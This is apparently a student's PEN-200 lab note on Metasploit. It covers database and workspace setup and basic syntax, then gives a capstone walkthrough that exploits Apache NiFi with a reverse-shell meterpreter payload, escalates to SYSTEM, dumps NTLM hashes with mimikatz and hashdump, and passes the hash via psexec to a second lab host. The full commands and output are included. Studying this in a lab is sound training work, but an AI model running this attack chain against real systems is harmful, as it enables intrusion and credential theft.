

# Setup
Uses a postgreSQL db for storing information about target hosts and keeping track of successful exploitation attempts, etc.

- Start postgreSQL service
```bash
sudo systemctl start postgresql.service

#enable at boot time
sudo systemctl enable postgresql.service
```

- Create and initialize MSF database
```bash
sudo msfdb init
	[i] Database already started
	[+] Creating database user 'msf'
	[+] Creating databases 'msf'
	[+] Creating databases 'msf_test'
	[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
	[+] Creating initial database schema
```

- Should update as often as possible as it's always being updated
```bash
sudo apt update; sudo apt install metasploit-framework
```

- Launch
```bash
msfconsole
```

- Check status of db
```bash
db_status
	[*] Connected to msf. Connection type: postgresql.
```


## Workspaces

Used in order to not mix up differing clients' assessments as everything is stored in a db between sessions

##### Create a workspaces
```bash
# msf6 >
workspace -a pen200
	[*] Added workspace: pen200
	[*] Workspace: pen200
```

##### See a list of workspaces
```bash
# msf6 >
workspace
	default
	* pen200
```


# Syntax

Includes several thousand modules divided into categories.

##### List all available commands
```bash
# msf6 >
help
```

Activate/ Switch/ Leave a module:
```bash
# use <module name>
msf6 > use auxiliary/scanner/portscan/tcp

# switch
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/syn
msf6 auxiliary(scanner/portscan/syn) > previous
msf6 auxiliary(scanner/portscan/tcp) >

# leave
msf6 auxiliary(scanner/portscan/tcp) > back
msf6 > 
```

Show/ Configure options:
```bash
#Show
show options

#Configure options - set & remove
set LHOST
unset RHOST

#Configure global options - set & remove
setg LHOST
unsetg LPORT
```

Run:
```bash
#two ways to send exploit
run
exploit
```








# Capstone

3. Use the methods and techniques from this Module to enumerate VM Group 1. Get access to both machines and find the flag. 
   Once the VM Group is deployed, please wait two more minutes for one of the web applications to be fully initialized.


```bash
msfconsole

db_nmap A 192.168.191.225
	...
	[*] Nmap: PORT     STATE SERVICE       VERSION
	[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
	[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	[*] Nmap: 445/tcp  open  microsoft-ds?
	[*] Nmap: 8080/tcp open  http          Jetty 9.4.48.v20220622
	[*] Nmap: |_http-server-header: Jetty(9.4.48.v20220622)
	[*] Nmap: |_http-title: NiFi
	[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	[*] Nmap: Host script results:
	[*] Nmap: | smb2-time:
	[*] Nmap: |   date: 2024-07-09T01:03:33
	[*] Nmap: |_  start_date: N/A
	[*] Nmap: | smb2-security-mode:
	[*] Nmap: |   3:1:1:
	[*] Nmap: |_    Message signing enabled but not required


db_nmap A 192.168.191.226
	...
	[*] Nmap: PORT    STATE SERVICE       VERSION
	[*] Nmap: 135/tcp open  msrpc         Microsoft Windows RPC
	[*] Nmap: 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
	[*] Nmap: 445/tcp open  microsoft-ds?
	[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	[*] Nmap: Host script results:
	[*] Nmap: | smb2-time:
	[*] Nmap: |   date: 2024-07-09T01:07:41
	[*] Nmap: |_  start_date: N/A
	[*] Nmap: | smb2-security-mode:
	[*] Nmap: |   3:1:1:
	[*] Nmap: |_    Message signing enabled but not required


# Attack .225
search "apache nifi"
	Matching Modules
	================
	   #  Name                                          Disclosure Date  Rank       Check  Description
	   -  ----                                          ---------------  ----       -----  -----------
	   0  exploit/multi/http/apache_nifi_processor_rce  2020-10-03       excellent  Yes    Apache NiFi API Remote Code Execution
	   1    \_ target: Unix (In-Memory)                 .                .          .      .
	   2    \_ target: Windows (In-Memory)              .                .          .      .
	   3  post/linux/gather/apache_nifi_credentials     .                normal     No     Apache NiFi Credentials Gather
	   4  exploit/linux/http/apache_nifi_h2_rce         2023-06-12       excellent  Yes    Apache NiFi H2 Connection String Remote Code Execution
	   5  auxiliary/scanner/http/apache_nifi_login      .                normal     No     Apache NiFi Login Scanner
	   6  auxiliary/scanner/http/apache_nifi_version    .                normal     No     Apache NiFi Version Scanner

use 2

show payloads
	...
	42   payload/cmd/windows/http/x64/meterpreter/reverse_tcp                       .                normal  No     HTTP Fetch, Windows x64 Reverse TCP Stager
	...

use 42
# set payload cmd/windows/http/x64/meterpreter/reverse_tcp

set rhosts 192.168.191.255
set lhost 192.168.45.166
set lport 443
set ssl false

options
# Set options w/ '>' at beginning of line
# Note:  ssl option will not be displayed, but there will be an error message if it's not set
	Module options (exploit/multi/http/apache_nifi_processor_rce):
	
	   Name          Current Setting  Required  Description
	   ----          ---------------  --------  -----------
	   BEARER-TOKEN                   no        JWT authenticate with
	   DELAY         5                yes       The delay (s) before stopping and deleting the processor
	   PASSWORD                       no        Password to authenticate with
	   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
	>   RHOSTS        192.168.191.225  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
	   RPORT         8080             yes       The target port (TCP)
	   TARGETURI     /                yes       The base path
	   USERNAME                       no        Username to authenticate with
	   VHOST                          no        HTTP server virtual host
	
	
	Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):
	
	   Name                Current Setting  Required  Description
	   ----                ---------------  --------  -----------
	   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
	   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
	   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
	   FETCH_FILENAME      PBiAKeecT        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
	   FETCH_SRVHOST                        no        Local IP to use for serving payload
	   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
	   FETCH_URIPATH                        no        Local URI to use for serving payload
	   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
	>   LHOST               192.168.45.166   yes       The listen address (an interface may be specified)
	>   LPORT               443              yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   1   Windows (In-Memory)


run

# meterpreter >
getuid
	Server username: ITWK03\alex

getsystem
	...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

getuid
	Server username: NT AUTHORITY\SYSTEM

load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

creds_msv
	[+] Running as SYSTEM
	[*] Retrieving msv credentials
	msv credentials
	===============
	
	Username     Domain  NTLM                              SHA1
	--------     ------  ----                              ----
	alex         ITWK03  5391f1724568f48a4aadba748109864c  3c0c8334c4b5a80345d40e00550539a7c847809c
	itwk04admin  ITWK03  445414c16b5689513d4ad8234391aacf  3b25183b0c39fd03069f586c7d238160f54b6cd7
	offsec       ITWK03  b26462f877427f4f6a87605d587ac60d  f237f7e3b1958e6047f1b29716a2f776dbdb5a19

hashdump
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:b26462f877427f4f6a87605d587ac60d:::
	alex:1002:aad3b435b51404eeaad3b435b51404ee:5391f1724568f48a4aadba748109864c:::
	DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	itwk04admin:1003:aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf:::
	offsec:1001:aad3b435b51404eeaad3b435b51404ee:b26462f877427f4f6a87605d587ac60d:::
	WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2cb4d723f9fce9b26d61be15e5ad1c51:::


# Attack .226
use exploit windows/smb/psexec

set rhosts 192.168.191.226
set smbuser itwk04admin
set smbpass aad3b435b51404eeaad3b435b51404ee:445414c16b5689513d4ad8234391aacf
set lhost 192.168.45.166

options
# Set options w/ '>' at beginning of line
	Module options (exploit/windows/smb/psexec):
	
	   Name                  Current Setting  Required  Description
	   ----                  ---------------  --------  -----------
	   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
	   SERVICE_DISPLAY_NAME                   no        The service display name
	   SERVICE_NAME                           no        The service name
	   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
	
	
	   Used when connecting via an existing SESSION:
	
	   Name     Current Setting  Required  Description
	   ----     ---------------  --------  -----------
	   SESSION                   no        The session to run this module on
	
	
	   Used when making a new connection via RHOSTS:
	
	   Name       Current Setting                                 Required  Description
	   ----       ---------------                                 --------  -----------
>	   RHOSTS     192.168.191.226                                 no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
	                                                                        ng-metasploit.html
	   RPORT      445                                             no        The target port (TCP)
	   SMBDomain  .                                               no        The Windows domain to use for authentication
>	   SMBPass    aad3b435b51404eeaad3b435b51404ee:445414c16b568  no        The password for the specified username
	              9513d4ad8234391aacf
>	   SMBUser    itwk04admin                                     no        The username to authenticate as
	
	
	Payload options (windows/meterpreter/reverse_tcp):
	
	   Name      Current Setting  Required  Description
	   ----      ---------------  --------  -----------
	   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
>	   LHOST     192.168.45.166   yes       The listen address (an interface may be specified)
	   LPORT     4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic

run

# Give it lots of tries.   Here's the output I got.
	[*] Started reverse TCP handler on 192.168.45.166:4444 
	[*] 192.168.191.226:445 - Connecting to the server...
	[*] 192.168.191.226:445 - Authenticating to 192.168.191.226:445 as user 'itwk04admin'...
	[*] 192.168.191.226:445 - Selecting PowerShell target
	[*] 192.168.191.226:445 - Executing the payload...
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[+] 192.168.191.226:445 - Service start timed out, OK if running a command or non-service executable...
	[*] Sending stage (176198 bytes) to 192.168.191.226
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 5 is not valid and will be closed
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 6 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 6 closed.
	[*] 192.168.191.226 - Meterpreter session 5 closed.
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 7 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 7 closed.
	[*] 192.168.191.226 - Meterpreter session 5 closed.  Reason: Died
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 8 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 8 closed.
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[-] Meterpreter session 9 is not valid and will be closed
	[*] 192.168.191.226 - Meterpreter session 9 closed.
	[*] Sending stage (176198 bytes) to 192.168.191.225
	[*] Exploit completed, but no session was created.
	[*] Meterpreter session 4 opened (192.168.45.166:4444 -> 192.168.191.226:54144) at 2024-07-08 23:37:45 -0400


sessions -l
	Active sessions
	===============
	  Id  Name  Type                     Information                   Connection
	  --  ----  ----                     -----------                   ----------
	  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ITWK03  192.168.45.166:4444 -> 192.168.191.225:63370 (192.168.191.225)
	  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ITWK04  192.168.45.166:4444 -> 192.168.191.226:54144 (192.168.191.226)

sessions -i 4
	[*] Starting interaction with 4...

# meterpreter
shell

# C:\Windows\system32>
powershell.exe

# PS C:\Windows\system32>
Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue -Force
	Directory: C:\Users\itwk04admin\Desktop

type C:\Users\itwk04admin\Desktop
	OS{d0d169c99c92c9007682007010a97137}
```

